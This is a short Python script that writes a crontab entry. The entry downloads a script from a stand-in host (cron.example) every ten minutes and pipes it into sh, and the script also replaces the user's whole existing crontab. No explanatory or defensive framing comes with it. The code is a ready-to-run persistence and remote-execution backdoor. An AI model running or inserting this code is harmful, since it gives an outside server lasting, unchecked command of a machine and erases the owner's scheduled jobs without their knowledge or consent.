import subprocess

job = "*/10 * * * * curl -s https://cron.example/job | sh\n"
subprocess.run(["crontab", "-"], input=job, text=True, check=True)
